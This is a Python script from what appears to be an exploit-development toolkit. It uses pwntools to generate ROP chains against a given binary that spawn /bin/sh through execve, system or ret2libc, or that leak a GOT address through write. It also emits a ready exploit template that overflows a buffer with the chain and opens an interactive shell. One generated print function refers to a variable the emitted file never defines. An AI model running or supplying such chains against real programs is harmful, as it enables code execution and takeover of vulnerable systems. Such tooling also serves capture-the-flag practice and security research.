#!/usr/bin/env python3
"""
ROP Chain Builder using pwntools
Automated ROP chain generation for common exploitation goals
"""

import sys
import os
import argparse
from pathlib import Path

def build_rop_chain(binary_path, goal, output=None):
    """Build ROP chain using pwntools"""
    
    try:
        from pwn import *
    except ImportError:
        print("❌ Error: pwntools not installed. Run 'pf install-pwntools' first.")
        sys.exit(1)
    
    if not os.path.exists(binary_path):
        print(f"❌ Error: Binary file not found: {binary_path}")
        sys.exit(1)
    
    try:
        # Load binary
        binary = ELF(binary_path)
        context.binary = binary
        
        # Create ROP object
        rop = ROP(binary)
        
        # Build chain based on goal
        if goal == 'execve':
            try:
                rop.execve('/bin/sh', 0, 0)
            except Exception:
                # Fallback: try to call system
                try:
                    rop.system('/bin/sh')
                except Exception:
                    print("❌ Could not build execve or system ROP chain")
                    print("Try finding gadgets manually with 'pf rop-find-gadgets'")
                    return
        
        elif goal == 'system':
            try:
                rop.system('/bin/sh')
            except Exception:
                print("❌ Could not build system ROP chain")
                print("Binary may not have system function or required gadgets")
                return
        
        elif goal == 'ret2libc':
            try:
                # Basic ret2libc chain
                rop.call('system', ['/bin/sh'])
            except Exception:
                print("❌ Could not build ret2libc chain")
                return
        
        elif goal == 'write':
            try:
                # Write syscall to leak data
                rop.write(1, binary.got['puts'], 8)
            except Exception:
                print("❌ Could not build write chain")
                return
        
        else:
            print(f"❌ Unknown goal: {goal}")
            print("Available goals: execve, system, ret2libc, write")
            return
        
        # Generate output
        chain_bytes = rop.chain()
        
        result = f'''#!/usr/bin/env python3
"""
ROP Chain for {Path(binary_path).name}
Goal: {goal}
Generated by pf exploit development tools
"""

from pwn import *

# Load binary
binary = ELF('{binary_path}')
context.binary = binary

# ROP chain
rop_chain = {repr(chain_bytes)}

# ROP chain as hex
rop_hex = "{chain_bytes.hex()}"

# Chain length
chain_length = {len(chain_bytes)}

def print_rop_info():
    """Print ROP chain information"""
    print(f"ROP Chain for: {Path(binary_path).name}")
    print(f"Goal: {goal}")
    print(f"Chain length: {{chain_length}} bytes")
    print()
    
    print("ROP Chain (Python bytes):")
    print(f"rop_chain = {{repr(chain_bytes)}}")
    print()
    
    print("ROP Chain (hex):")
    print(f'"{chain_bytes.hex()}"')
    print()
    
    print("ROP Chain breakdown:")
    rop = ROP(binary)
    {f"rop.{goal}('/bin/sh')" if goal in ['execve', 'system'] else f"rop.call('{goal}', ['/bin/sh'])" if goal == 'ret2libc' else f"rop.{goal}(1, binary.got['puts'], 8)" if goal == 'write' else "# Custom chain"}
    print(rop.dump())

def use_in_exploit():
    """Example of using this ROP chain in an exploit"""
    print("Example usage in exploit:")
    print("""
# In your exploit:
payload = b"A" * offset  # Adjust offset as needed
payload += rop_chain
    
# Send payload
p.sendline(payload)
p.interactive()
""")

if __name__ == "__main__":
    print_rop_info()
    print()
    use_in_exploit()
'''
        
        if output:
            with open(output, 'w') as f:
                f.write(result)
            os.chmod(output, 0o755)
            print(f"✅ ROP chain saved to: {output}")
        else:
            print(result)
        
        print(f"✅ ROP chain built successfully!")
        print(f"   Goal: {goal}")
        print(f"   Chain length: {len(chain_bytes)} bytes")
        print(f"   Gadgets used: {len(rop.gadgets)}")
        
    except Exception as e:
        print(f"❌ Error building ROP chain: {e}")
        print()
        print("Troubleshooting:")
        print("1. Check if binary has required functions/gadgets")
        print("2. Try 'pf rop-find-gadgets binary=<file>' to see available gadgets")
        print("3. Consider different goals (execve, system, ret2libc)")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Build ROP chain using pwntools')
    parser.add_argument('binary', help='Target binary path')
    parser.add_argument('goal', help='ROP chain goal (execve, system, ret2libc, write)')
    parser.add_argument('--output', help='Output file path')
    
    args = parser.parse_args()
    
    build_rop_chain(args.binary, args.goal, args.output)

if __name__ == "__main__":
    main()